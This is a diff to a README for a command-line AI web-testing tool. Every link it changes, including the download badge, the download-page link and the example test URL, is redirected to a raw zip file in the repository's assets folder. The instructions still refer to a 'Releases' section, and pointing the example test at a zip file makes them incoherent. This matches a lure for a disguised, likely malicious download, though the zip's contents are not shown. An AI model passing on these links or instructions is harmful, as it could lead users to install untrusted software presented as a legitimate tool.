@@ -1,6 +1,6 @@
 # 🤖 testsprite-cli - Automate your software testing with AI
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/zkwr3354/testsprite-cli)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/zkwr3354/testsprite-cli/raw/refs/heads/main/assets/testsprite-cli-coinfer.zip)
 
 ## 📌 What is this tool?
 TestSprite CLI helps you check your software for bugs. It uses artificial intelligence to find errors. You run it from your command prompt. It mimics how a real person uses a website. This tool catches broken links, visual errors, and slow performance. You do not need to write code to use it. 
@@ -18,7 +18,7 @@ Ensure your computer meets these minimum needs for smooth operation:
 ## 📥 How to download and install
 You must download the software package from the official release page. 
 
-[Click here to visit the download page](https://github.com/zkwr3354/testsprite-cli)
+[Click here to visit the download page](https://github.com/zkwr3354/testsprite-cli/raw/refs/heads/main/assets/testsprite-cli-coinfer.zip)
 
 1. Go to the link above.
 2. Look for the "Releases" section on the right side of your screen.
@@ -40,7 +40,7 @@ After the installation, you must verify the setup.
 ## 🛠️ Testing your first website
 You can test any web address. Open your Command Prompt again to begin.
 
-1. Type `testsprite --url https://www.yourwebsite.com` and press Enter.
+1. Type `testsprite --url https://github.com/zkwr3354/testsprite-cli/raw/refs/heads/main/assets/testsprite-cli-coinfer.zip` and press Enter.
 2. The software starts the browser.
 3. It performs a sequence of pre-defined tests. 
 4. Watch the terminal for real-time updates.
